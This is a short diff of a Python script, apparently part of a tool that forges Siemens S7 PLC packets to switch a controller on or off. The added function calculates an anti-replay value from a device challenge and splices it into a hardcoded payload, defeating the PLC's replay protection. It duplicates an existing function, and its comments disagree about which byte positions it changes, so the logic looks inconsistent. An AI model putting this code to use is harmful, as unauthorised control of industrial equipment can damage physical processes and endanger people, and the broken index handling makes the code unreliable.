@@ -214,6 +214,18 @@ def fInyectarAntiReplayEnPayload(pPayload):
   vPayloadAInyectar = pPayload[:48].hex() + vAntiReplayHex + pPayload[50:].hex() # Reemplazar el byte 24 con el nuevo valor
   return vPayloadAInyectar
 
+def fInyectarAntiReplayEnPayload(pPayload):
+    # Asumiendo que pPayload es una cadena hexadecimal
+    vChallenge = pPayload[48:50]                                # Extraer el challenge
+    vAntiReplay = int(vChallenge, 16) + 0x80                    # Calcular el valor anti-replay
+    
+    # Insertar los dígitos hexadecimales individualmente (similar a tu función fEncenderPLC)
+    # Asumiendo que estamos modificando posiciones 46-47 en lugar de 48-49
+    vPayloadAInyectar = pPayload[:46] + hex(vAntiReplay)[2] + pPayload[47:]
+    vPayloadAInyectar = vPayloadAInyectar[:47] + hex(vAntiReplay)[3] + vPayloadAInyectar[48:]
+    
+    return vPayloadAInyectar
+
 def fEncApPLC(pHostPLC, pAction):
   # Definir payload para solicitar la comunicación COPT. Longitud: 89
   vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
